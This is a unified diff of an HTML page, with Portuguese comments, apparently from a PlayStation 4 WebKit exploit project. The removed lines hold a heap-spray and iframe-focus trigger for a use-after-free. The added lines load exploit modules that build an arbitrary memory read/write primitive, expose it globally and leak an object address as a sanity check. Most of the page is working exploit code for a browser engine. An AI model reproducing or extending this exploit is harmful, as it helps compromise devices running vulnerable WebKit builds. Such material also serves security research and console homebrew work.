@@ -1,48 +1,102 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PS4 WebKit RW Primitive</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body {
+    height: 100%;
+    background: #0b0f19;
+    color: #c8ced8;
+    font: 14px/1.5 "Segoe UI", system-ui, sans-serif;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    gap: 18px;
+  }
+  #status {
+    font-size: 20px; font-weight: 700; color: #fff;
+    min-height: 1.5em;
+  }
+  #log {
+    width: 90%; max-width: 720px; height: 320px;
+    background: #111827; border: 1px solid #1f2937;
+    border-radius: 10px; padding: 12px 14px;
+    overflow-y: auto; font-family: ui-monospace, SFMono-Regular, monospace;
+    font-size: 12px; color: #9fb1c3;
+    white-space: pre-wrap; word-break: break-all;
+  }
+  #log .ok { color: #4ade80; }
+  #log .err { color: #f87171; }
+  #log .info { color: #60a5fa; }
+</style>
+</head>
 <body>
-<iframe id="frame_a" loading="lazy"></iframe>
-<iframe id="frame_b" srcdoc="b"></iframe>
-<div id="container" tabindex="0" autofocus></div>
+
+<div id="status">Inicializando...</div>
 <div id="log"></div>
-<script>
-const logEl = document.getElementById("log");
-let visit = localStorage.getItem("visit") || "0";
-localStorage.setItem("visit", String(parseInt(visit) + 1));
 
-// Spray: StringImpl(128 chars Latin-1) = 16 header + 128 = 144 bytes â†’ bin 160
-// ConteÃºdo: 0x4141414141414141 nos primeiros 8 bytes â†’ se scrollHeight ler
-// isso como vtable ptr, o crash vai para 0x4141...  em vez de vtable do ScheduledLocationChange
-const SPRAY_CONTENT = "A".repeat(128);
+<script type="module">
+  import { establishPrimitive } from "./resources/core.js";
+  import { installWindowP } from "./resources/mem.js";
 
-logEl.addEventListener("DOMSubtreeModified", function handler() {
-    logEl.removeEventListener("DOMSubtreeModified", handler);
-    window._spray = [];
-    for (let i = 0; i < 500; i++) {
-        window._spray.push(SPRAY_CONTENT);
-    }
-});
+  const status = document.getElementById("status");
+  const logBox = document.getElementById("log");
 
-const op = () => {
-    logEl.textContent += visit + "\n";
-    logEl.scrollTop = logEl.scrollHeight;
-};
+  function log(msg, cls = "info") {
+    const line = document.createElement("div");
+    line.className = cls;
+    line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+    logBox.appendChild(line);
+    logBox.scrollTop = logBox.scrollHeight;
+  }
 
-let frame = document.getElementById("frame_a");
-op(); op();
+  function onCoreEvent(tag, detail) {
+    log(`${tag}: ${detail}`, "info");
+  }
 
-addEventListener("load", () => {
-    op();
-    frame.srcdoc = "a";
-    op();
-    frame.contentWindow?.addEventListener("blur", () => {});
-    frame.focus();
-    op();
-});
+  function onMemEvent(tag, detail) {
+    log(`${tag}: ${detail}`, "info");
+  }
 
-container.onfocusin = () => {
-    document.body.innerHTML = "";
-};
+  log("Carregando módulos...", "ok");
+  status.textContent = "Executando exploit...";
+
+  establishPrimitive({ onEvent: onCoreEvent })
+    .then(carrier => {
+      log("Core: primitivo estabelecido", "ok");
+      log(`Tentativas: ${carrier.attempts}`, "info");
+
+      const prim = installWindowP(carrier, {
+        onEvent: onMemEvent,
+        promote: true   // tenta promover para real pair
+      });
+
+      log("Mem: real pair ativo", "ok");
+      log(`window.p está disponível`, "ok");
+
+      // Expor globalmente para uso manual/debug
+      window.__carrier = carrier;
+      window.__prim = prim;
+
+      status.textContent = "RW Primitivo OK";
+      status.style.color = "#4ade80";
+
+      // Teste rápido de sanity: leak do próprio carrier
+      try {
+        const testAddr = prim.leakval(prim);
+        log(`Sanity leak(prim) = 0x${testAddr.toString(16)}`, "ok");
+      } catch (e) {
+        log(`Sanity leak falhou: ${e.message}`, "err");
+      }
+    })
+    .catch(err => {
+      log(`FALHA: ${err.name}: ${err.message}`, "err");
+      status.textContent = "Falha no exploit";
+      status.style.color = "#f87171";
+    });
 </script>
+
 </body>
 </html>
